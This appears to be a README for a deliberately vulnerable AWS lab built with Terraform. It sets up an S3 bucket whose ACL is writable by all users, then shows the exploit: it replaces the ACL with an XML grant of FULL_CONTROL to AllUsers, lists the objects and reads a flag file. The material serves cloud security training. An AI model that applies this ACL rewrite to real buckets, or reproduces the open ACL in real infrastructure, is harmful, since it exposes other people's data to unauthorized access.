# AWS S3 Bucket ACL writable vulnerability environment

English | [中文](./README_CN.md)

## Description

This is the scenario in which the AWS S3 bucket ACL is writable.

After you build an environment using Terraform, users can access S3 resources that are otherwise unreadable by modifying the Bucket ACL policy.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/aws/s3/bucket_acl_writable/
```

Configure AWS Access Credentials

```shell
aws configure
```

> You can see the access key in the AWS [Console --> Security Credentials]

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

After the environment is set up, you can see the created Bucket at Outputs.

This Bucket has Bucket ACL read and write permissions.

## Vulnerability Utilization

List Object, return access denied

![image](../../../images/1652335945.png)

Attempt to read the Bucket's ACL policy

```shell
https://houxianxxxxx.s3.us-east-1.amazonaws.com/?acl
```

![image](../../../images/1652336104.png)

Try to use the PUT method to modify the ACL policy of the Bucket.

The original ACL policy:

```xml
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://acs.amazonaws.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>WRITE_ACP</Permission>
</Grant>
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://acs.amazonaws.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>READ_ACP</Permission>
</Grant>
```

New ACL Policy:

```xml
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://acs.amazonaws.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>FULL_CONTROL</Permission>
</Grant>
```

![image](../../../images/1652336299.png)

Try traversing the Object again, you can see that it can be traversed already, which means that the ACL policy just uploaded is in effect.

![image](../../../images/1652336374.png)

In the Bucket, the flag file is found.

```shell
https://houxianxxxxx.s3.us-east-1.amazonaws.com/flag1650859
```

![img](../../../images/1652336457.png)

Get the flag.

## Destroy the environment

```shell
terraform destroy
```
